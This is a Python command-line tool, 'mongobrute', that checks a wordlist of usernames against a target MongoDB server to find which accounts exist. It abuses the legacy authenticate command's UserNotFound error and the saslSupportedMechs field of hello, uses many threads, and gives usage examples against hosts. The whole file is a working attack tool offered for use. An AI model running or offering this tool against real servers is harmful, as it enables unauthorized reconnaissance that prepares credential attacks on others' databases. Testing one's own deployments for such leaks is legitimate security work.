#!/usr/bin/env python3
"""
mongobrute - MongoDB User Enumeration Tool
Exploits two information disclosure vectors in MongoDB:
  1. Legacy `authenticate` command: rethrows UserNotFound to the client
  2. `saslSupportedMechs` in `hello`: presence/absence of the field reveals user existence

References:
  - src/mongo/db/commands/authentication_commands.cpp (UserNotFound leak)
  - src/mongo/db/auth/sasl_commands.cpp (SASL path masks it correctly)
"""

import argparse
import sys
import concurrent.futures
import json
from typing import Optional

try:
    from pymongo import MongoClient
    from pymongo.errors import PyMongoError, OperationFailure
    from pymongo import monitoring
except ImportError:
    print("[-] pymongo is required. Install with: pip install pymongo")
    sys.exit(1)


VERSION = "1.0.0"
BANNER = f"""
  __  ___           _                        _           
 /  |/  /__  ___ __(_)__  ___ _  _  ___ _  _| |_ ___ _ _ 
 / /|_/ / _ \\/ _ `/ / _ \\/ _ \\ || |/ _ \\ || |  _/ _ \\ '_|
/_/  /_/\\___/\\__, /_\\___/\\___/\\_,_/\\___/\\_,_|\\__\\___/_|  
            /____/  v{VERSION}
MongoDB User Enumeration Tool
"""


COLORS = {
    "red": "\033[91m",
    "green": "\033[92m",
    "yellow": "\033[93m",
    "cyan": "\033[96m",
    "reset": "\033[0m",
}


def color(text: str, c: str) -> str:
    return f"{COLORS.get(c, '')}{text}{COLORS['reset']}"


class MalformedReplyMonitor(monitoring.CommandListener):
    """Suppress pymongo's verbose OperationFailure traceback noise."""

    def started(self, event):
        pass

    def succeeded(self, event):
        pass

    def failed(self, event):
        pass


def check_authenticate_command(client: MongoClient, username: str, db: str) -> Optional[bool]:
    """
    Vector 1: Legacy `authenticate` command.

    In src/mongo/db/commands/authentication_commands.cpp (~line 132-145),
    CmdAuthenticate::Invocation::typedRun() rethrows ErrorCodes::UserNotFound
    directly to the client.  All other failures are masked as "Authentication failed."
    """
    cmd = {
        "authenticate": 1,
        "user": username,
        "mechanism": "SCRAM-SHA-256",
        "db": db,
    }
    try:
        client.admin.command(
            "authenticate",
            user=username,
            mechanism="SCRAM-SHA-256",
            db=db,
        )
        # Login succeeded with a blank password -- user exists (weak/no password)
        return True
    except OperationFailure as e:
        code = e.code
        msg = str(e)
        if code == 11 or "UserNotFound" in msg:
            return False
        if code == 18 or "Authentication failed" in msg:
            return True
        if code == 14 or "MechanismUnavailable" in msg:
            return True
        return None
    except PyMongoError:
        return None


def check_sasl_supported_mechs(client: MongoClient, username: str, db: str) -> Optional[bool]:
    """
    Vector 2: saslSupportedMechs in hello command.

    When `saslSupportedMechs: "db.username"` is sent in a hello command, the
    server looks up the user and returns their supported SASL mechanisms.
    If the user doesn't exist, the field is absent from the response.
    """
    try:
        hello_cmd = {"hello": 1, "saslSupportedMechs": f"{db}.{username}"}
        resp = client.admin.command(hello_cmd)
        return "saslSupportedMechs" in resp and len(resp["saslSupportedMechs"]) > 0
    except (PyMongoError, OperationFailure):
        return None


def probe_user(client: MongoClient, username: str, db: str, vector: str) -> tuple:
    """Returns (username, exists, method) tuple."""
    exists: Optional[bool] = None
    method: str = ""

    if vector in ("authenticate", "both"):
        exists = check_authenticate_command(client, username, db)
        if exists is not None:
            method = "authenticate"

    if (vector in ("sasl", "both")) and (exists is None or (vector == "both" and exists is False)):
        exists2 = check_sasl_supported_mechs(client, username, db)
        if exists2 is not None:
            exists = exists2 if exists is None else (exists or exists2)
            method = "saslSupportedMechs" if not method else f"{method}+saslSupportedMechs"

    return (username, exists, method)


def main():
    parser = argparse.ArgumentParser(
        description="MongoDB User Enumeration Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t 10.0.0.1 -w users.txt
  %(prog)s -t 10.0.0.1:27017 -w users.txt -T 32 -d admin
  %(prog)s -t cluster.mongodb.net -w users.txt --tls --vector sasl
        """,
    )
    parser.add_argument("-t", "--target", required=True, help="MongoDB host[:port]")
    parser.add_argument("-w", "--wordlist", required=True, help="Username wordlist file")
    parser.add_argument("-d", "--db", default="admin", help="Authentication database (default: admin)")
    parser.add_argument("-T", "--threads", type=int, default=16, help="Concurrent threads (default: 16)")
    parser.add_argument("--timeout", type=int, default=5, help="Connection timeout in seconds (default: 5)")
    parser.add_argument(
        "--vector",
        choices=["authenticate", "sasl", "both"],
        default="both",
        help="Enumeration vector to use (default: both)",
    )
    parser.add_argument("--tls", action="store_true", help="Use TLS for the connection")
    parser.add_argument("--tlsCAFile", help="TLS CA certificate file")
    parser.add_argument("--tlsAllowInvalidCertificates", action="store_true", help="Allow invalid TLS certificates")
    parser.add_argument("--output", "-o", help="Output results to JSON file")
    parser.add_argument("--quiet", "-q", action="store_true", help="Suppress banner and only show found users")
    parser.add_argument("--version", action="version", version=f"%(prog)s {VERSION}")

    args = parser.parse_args()

    if not args.quiet:
        print(BANNER)

    target = args.target
    if ":" not in target:
        target = f"{target}:27017"

    usernames: list[str] = []
    try:
        with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
            usernames = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] Wordlist not found: {args.wordlist}")
        sys.exit(1)

    if not usernames:
        print("[-] Wordlist is empty")
        sys.exit(1)

    if not args.quiet:
        print(f"[*] Target:      {target}")
        print(f"[*] Database:    {args.db}")
        print(f"[*] Wordlist:    {args.wordlist} ({len(usernames)} entries)")
        print(f"[*] Vector:      {args.vector}")
        print(f"[*] Threads:     {args.threads}")
        print(f"[*] Timeout:     {args.timeout}s")
        if args.tls:
            print(f"[*] TLS:         enabled")
        print()

    monitoring.register(MalformedReplyMonitor())

    found_users: list[dict] = []
    total = len(usernames)
    done = 0

    def print_progress():
        nonlocal done
        done += 1
        if done % 10 == 0 or done == total:
            print(f"\r[*] Progress: {done}/{total} ({done*100//total}%)", end="", file=sys.stderr)
            sys.stderr.flush()

    def process(username: str) -> tuple:
        try:
            client = MongoClient(
                f"mongodb://{target}/",
                serverSelectionTimeoutMS=args.timeout * 1000,
                tls=args.tls,
                tlsCAFile=args.tlsCAFile,
                tlsAllowInvalidCertificates=args.tlsAllowInvalidCertificates,
            )
            result = probe_user(client, username, args.db, args.vector)
            client.close()
            print_progress()
            return result
        except Exception as e:
            print_progress()
            return (username, None, f"error: {e}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(process, u): u for u in usernames}
        for future in concurrent.futures.as_completed(futures):
            try:
                username, exists, method = future.result()
                if exists is True:
                    found_users.append({"username": username, "method": method})
                    status = f"  {color('[+]', 'green')} {username} ({color('EXISTS', 'green')}) [{method}]"
                    print(f"\r{' ' * 60}\r{status}")
                    sys.stdout.flush()
                elif exists is None and not args.quiet:
                    print(f"\r{' ' * 60}\r  {color('[?]', 'yellow')} {username} ({color('UNKNOWN', 'yellow')})")
                    sys.stdout.flush()
            except Exception:
                pass

    print(f"\r{' ' * 60}\r", end="")
    print()

    if not found_users:
        print(color("[-] No users found or enumeration failed.", "red"))
    else:
        print(color(f"[+] Found {len(found_users)} user(s):", "green"))
        for u in found_users:
            print(f"    {u['username']} [{u['method']}]")

    if args.output and found_users:
        with open(args.output, "w") as f:
            json.dump({"target": target, "db": args.db, "users": found_users}, f, indent=2)
        print(f"\n[*] Results saved to {args.output}")


if __name__ == "__main__":
    main()
